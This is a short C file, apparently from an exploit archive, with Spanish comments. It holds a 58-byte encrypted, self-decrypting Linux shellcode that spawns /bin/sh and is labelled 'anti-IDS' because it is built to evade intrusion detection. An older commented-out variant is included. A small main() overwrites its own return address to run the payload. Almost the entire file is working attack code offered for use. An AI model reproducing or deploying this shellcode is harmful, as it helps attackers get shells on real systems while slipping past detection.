/* !!!!!! PRIVATE !!!!!!!

   // ANTI-IDS SHELLCODE //
   // !!!!!!!!!!!!!!!!!! //

   s0t4ipv6@shellcode.com.ar
   0x1d abril 0x7d2
   ./test.c

   !!! Shellcode (execve sh) Encriptada
   !!! AHORA EN 58 BYTES !!!!!!!!!!!!!!

   Notese que la encripcion se ha hecho a toda la shellcode y no solamente al string /bin/sh.

   Perteneciente al paquete JempiScodes.tgz, por Matias Sedalo <s0t4ipv6@shellcode.com.ar>.
   http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz !!

   En caso de requerirla para otra plataforma, dentro de la linea BSD. Mailme.

*/
#include <stdio.h>

char shellcode[]=

"\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f" // 0x14 de mayo
"\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8"
"\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2"
"\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c";		// ***********

/*
"\xeb\x29\x31\xc0\x31\xdb\x8b\x24\x24\x29\xd2\x4a\x31\xc9\xb1"
"\x18\xb3\x53\x8a\x04\x0c\xf6\xd3\x30\xd8\x88\x04\x17\x86\xc3"
"\x49\x4a\x85\xc9\x75\xee\x42\x89\xec\x01\xd7\x57\xc3\xe8\xd2"
"\xff\xff\xff\x53\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2"
"\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c";
*/

void main() {
	int *ret;
	ret = (int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
	(*ret) =(int)shellcode;
}

// ANTI-IDS SHELLCODE //
// !!!!!!!!!!!!!!!!!! //

// milw0rm.com [2004-09-12]